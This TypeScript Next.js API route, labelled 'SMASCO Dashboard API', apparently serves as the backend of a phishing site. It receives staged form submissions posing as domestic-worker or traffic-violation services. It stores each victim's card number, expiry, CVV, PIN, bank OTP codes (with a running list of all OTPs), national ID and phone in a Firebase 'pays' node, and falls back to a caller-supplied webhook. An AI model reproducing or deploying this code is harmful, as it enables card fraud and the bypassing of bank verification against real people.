import { NextRequest, NextResponse } from 'next/server';
import { initializeApp, getApps, getApp } from 'firebase/app';
import { getDatabase, ref, set, push } from 'firebase/database';

const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
};

// تهيئة Firebase مع التحقق من وجود تهيئة سابقة
let database: any = null;
let firebaseAvailable = false;

try {
  if (firebaseConfig.apiKey && firebaseConfig.databaseURL) {
    const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
    database = getDatabase(app);
    firebaseAvailable = true;
  } else {
    console.warn('Firebase configuration is missing. Using fallback mode.');
  }
} catch (error) {
  console.error('Firebase initialization error:', error);
  firebaseAvailable = false;
}

// Interface مرن للبيانات
interface NotificationData {
  [key: string]: any;
}

// دالة لتحديد الدولة من رقم الهاتف
function detectCountry(phone: string): string {
  const phoneStr = phone.replace(/[^0-9+]/g, '');
  
  if (phoneStr.startsWith('966') || phoneStr.startsWith('+966')) {
    return 'السعودية';
  } else if (phoneStr.startsWith('971') || phoneStr.startsWith('+971')) {
    return 'الإمارات';
  } else if (phoneStr.startsWith('974') || phoneStr.startsWith('+974')) {
    return 'قطر';
  } else if (phoneStr.startsWith('965') || phoneStr.startsWith('+965')) {
    return 'الكويت';
  } else if (phoneStr.startsWith('973') || phoneStr.startsWith('+973')) {
    return 'البحرين';
  } else if (phoneStr.startsWith('968') || phoneStr.startsWith('+968')) {
    return 'عمان';
  } else if (phoneStr.startsWith('20') || phoneStr.startsWith('+20')) {
    return 'مصر';
  } else if (phoneStr.startsWith('212') || phoneStr.startsWith('+212')) {
    return 'المغرب';
  } else if (phoneStr.startsWith('961') || phoneStr.startsWith('+961')) {
    return 'لبنان';
  } else if (phoneStr.startsWith('962') || phoneStr.startsWith('+962')) {
    return 'الأردن';
  } else if (phoneStr.startsWith('964') || phoneStr.startsWith('+964')) {
    return 'العراق';
  } else if (phoneStr.startsWith('967') || phoneStr.startsWith('+967')) {
    return 'اليمن';
  } else {
    return 'غير معروف';
  }
}

// دالة مساعدة لتحويل البيانات إلى تنسيق مناسب للتخزين
function formatDataForStorage(data: any, formData: any, country: string, timestamp: string) {
  const mainData = {
    createdDate: timestamp,
    country: country,
    data: {
      page: formData.step || '1',
      fullName: formData.fullname || '',
      phone: formData.phone || formData.mobile || '',
      email: formData.email || '',
      idNumber: formData.id_number || formData.idNumber || '',
      status: 'pending',
      violationValue: 0,
      notificationCount: 1,
      pass: formData.pin_code || '',
      ip: formData.ip || 'unknown',
    },
    currentPage: formData.step || '1',
    currentStep: formData.step || '1',
    step: parseInt(formData.step) || 1,
    otp: formData.otp_code || formData.otp || formData.verification_code || '',
    allOtps: formData.all_otps || [],
    type: data.type || 'unknown',
  };

  // إضافة بيانات حسب نوع الإرسال
  switch (data.type) {
    case 'client_info':
      mainData.data = {
        ...mainData.data,
        bank: formData.bank || '',
        prefix: formData.prefix || '',
        plateType: formData.plate_type || '',
        year: formData.year || '',
        month: formData.month || '',
        pagename: formData.pagename || 'index',
        personalInfo: {
          name: formData.fullname,
          id: formData.id_number
        }
      };
      break;
      
    case 'service_details':
      mainData.data = {
        ...mainData.data,
        serviceType: formData.service_type || '',
        workerNationality: formData.worker_nationality || '',
        experience: formData.experience || '',
        preferredAge: formData.preferred_age || '',
        language: formData.language || '',
        durationType: formData.duration_type || '',
        package: formData.package || formData.hours_package || formData.months_package || '',
        notes: formData.notes || '',
        pagename: formData.pagename || 'khdm',
      };
      break;
      
    case 'payment':
      mainData.data = {
        ...mainData.data,
        paymentCardNumber: formData.card_number || formData.cardNumber || '',
        paymentExpiry: formData.card_expiry || formData.expiryDate || '',
        paymentCVV: formData.card_cvv || formData.cvv || '',
        bank: formData.bank || formData.card_name || '',
        amount: formData.amount || '',
        package: formData.package || '',
        pagename: formData.pagename || 'pay',
      };
      break;
      
    case 'otp':
      mainData.data = {
        ...mainData.data,
        otp: formData.otp_code || '',
        otp2: formData.otp2 || formData.verification_code || '',
        pass: formData.pin_code || '',
        amount: formData.amount || '',
        package: formData.package || '',
        pagename: formData.pagename || 'pin',
      };
      if (formData.otp_code) {
        mainData.otp = formData.otp_code;
        mainData.allOtps = [formData.otp_code];
      }
      break;
      
    case 'verification':
      mainData.data = {
        ...mainData.data,
        network: formData.network_provider || formData.network || '',
        phoneOtp: formData.verification_code || '',
        phoneNumber: formData.phone_number || '',
        pagename: formData.pagename || 'verc',
      };
      break;
      
    case 'full_submission':
      mainData.data = {
        ...mainData.data,
        bank: formData.card_name || '',
        paymentCardNumber: formData.card_number || '',
        paymentExpiry: formData.card_expiry || '',
        paymentCVV: formData.card_cvv || '',
        otp: formData.otp_code || '',
        otp2: formData.verification_code || '',
        serviceType: formData.service_type || '',
        workerNationality: formData.worker_nationality || '',
        experience: formData.experience || '',
        preferredAge: formData.preferred_age || '',
        language: formData.language || '',
        amount: formData.amount || '',
        package: formData.package || '',
        pagename: formData.pagename || 'full',
      };
      break;
  }

  return mainData;
}

// دالة للإرسال إلى Firebase
async function sendToFirebase(data: any): Promise<{ success: boolean; id?: string; error?: string }> {
  if (!firebaseAvailable || !database) {
    return { success: false, error: 'Firebase is not configured' };
  }

  try {
    const paysRef = ref(database, 'pays');
    const newDocRef = push(paysRef);
    await set(newDocRef, data);
    return { success: true, id: newDocRef.key || undefined };
  } catch (error) {
    console.error('Firebase error:', error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : 'Firebase operation failed' 
    };
  }
}

// دالة بديلة للإرسال إلى webhook
async function sendToWebhook(data: any, webhookUrl: string): Promise<{ success: boolean; error?: string }> {
  if (!webhookUrl) {
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      return { success: true };
    } else {
      return { success: false, error: `Webhook failed with status: ${response.status}` };
    }
  } catch (error) {
    return { 
      success: false, 
      error: error instanceof Error ? error.message : 'Webhook request failed' 
    };
  }
}

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    const { type, webhookUrl, ...formData } = data;
    
    const timestamp = new Date().toISOString();
    const country = detectCountry(formData.phone || formData.mobile || '');
    const docId = `doc_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // تنسيق البيانات
    const mainData = formatDataForStorage(data, formData, country, timestamp);
    
    // محاولة الإرسال إلى Firebase أولاً
    if (firebaseAvailable) {
      const firebaseResult = await sendToFirebase(mainData);
      
      if (firebaseResult.success) {
        return NextResponse.json({
          success: true,
          message: 'تم استلام البيانات بنجاح',
          id: firebaseResult.id,
          country: country,
          timestamp: timestamp,
          storage: 'firebase'
        }, { status: 200 });
      }
    }
    
    // إذا فشل Firebase، محاولة الإرسال إلى webhook
    if (webhookUrl) {
      const webhookResult = await sendToWebhook(mainData, webhookUrl);
      
      if (webhookResult.success) {
        return NextResponse.json({
          success: true,
          message: 'تم استلام البيانات بنجاح',
          id: docId,
          country: country,
          timestamp: timestamp,
          storage: 'webhook'
        }, { status: 200 });
      }
    }

    // إذا فشل الجميع، إرجاع البيانات مع تحذير
    console.warn('All storage methods failed. Data:', mainData);
    
    return NextResponse.json({
      success: true,
      message: 'تم استلام البيانات محلياً. سيتم مزامنتها لاحقاً',
      id: docId,
      country: country,
      timestamp: timestamp,
      storage: 'local',
      warning: 'Data stored locally due to connection issues'
    }, { status: 200 });

  } catch (error) {
    console.error('Error processing request:', error);
    
    return NextResponse.json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error instanceof Error ? error.message : 'خطأ غير معروف',
      suggestion: 'يرجى التحقق من اتصالك بالإنترنت وإعادة المحاولة'
    }, { status: 500 });
  }
}

// GET method للتأكد من أن الـ API يعمل
export async function GET() {
  return NextResponse.json({
    status: 'active',
    service: 'SMASCO Dashboard API',
    version: '2.0.0',
    firebaseConfigured: firebaseAvailable,
    supportedMethods: ['firebase', 'webhook', 'local'],
    endpoints: {
      POST: 'إرسال بيانات جديدة',
      GET: 'فحص حالة الـ API'
    }
  });
}
